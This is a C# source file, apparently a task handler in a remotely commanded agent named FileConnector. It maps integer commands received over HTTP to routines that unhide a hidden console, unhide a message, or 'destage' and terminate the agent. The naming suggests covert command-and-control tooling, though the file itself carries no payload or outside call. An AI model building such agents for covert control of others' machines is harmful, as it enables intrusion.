using FileConnector.Models;
using FileConnector.Utils;
using FileConnectorCommon;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Security;

namespace FileConnector.HTTP.Tasks
{
    class TaskAgentSelfExec : IHttpServerTask
    {
        private Logger log;

        private enum AgentSelfExecCmds : int
        {
           UnhideConsole = 0, 
           UnhideMessage = 1, 
           SelfTerminate = 2, 
        }
        public TaskAgentSelfExec(){

            log = Config.ConfigLog.getLog();
        }
        public void DoRequest(ref CommandMessageReq cmReq, ref CommandMessageResp cmResp )
        {
            int agentExecCmd;

            if (cmReq.taskArgs.Count != 0)
            {

                try
                {
                    string agentExecCmdStr = cmReq.taskArgs.FirstOrDefault();
                    log.Debug($"task Arg log source: {agentExecCmdStr}");
                    if (int.TryParse((string) cmReq.taskArgs.FirstOrDefault(), out agentExecCmd))
                    {
                        log.Debug($"task Arg log level (int): {agentExecCmd}");
                        switch (agentExecCmd)
                        {
                            case (int)AgentSelfExecCmds.UnhideConsole:
                                log.Debug($"Agent Exec: unhiding console");
                                ServerTasks.Impl.TaskAgentUnhideConsole uc = 
                                    new  ServerTasks.Impl.TaskAgentUnhideConsole();
                                uc.Run();
                                break;
                            case (int)AgentSelfExecCmds.UnhideMessage:
                                log.Debug($"Agent Exec: unhiding message");
                                ServerTasks.Impl.TaskAgentUnhideMessage um = 
                                    new  ServerTasks.Impl.TaskAgentUnhideMessage();
                                um.Run();
                                break;
                            case (int)AgentSelfExecCmds.SelfTerminate:
                                log.Debug($"Agent Exec: self terminating");
                                ServerTasks.Impl.TaskAgentDestage ts = 
                                    new  ServerTasks.Impl.TaskAgentDestage();
                                ts.Run();
                                break;
                            default:
                                break;
                        }
                    }
                }catch(Exception e)
                {
                    log.Error($"Cannot process command request argument (agent exec): {e.Message}");
                }

            }
        }
        public void DoResponse(HttpClient client, CommandMessageResp cmResp) { }
    }
}
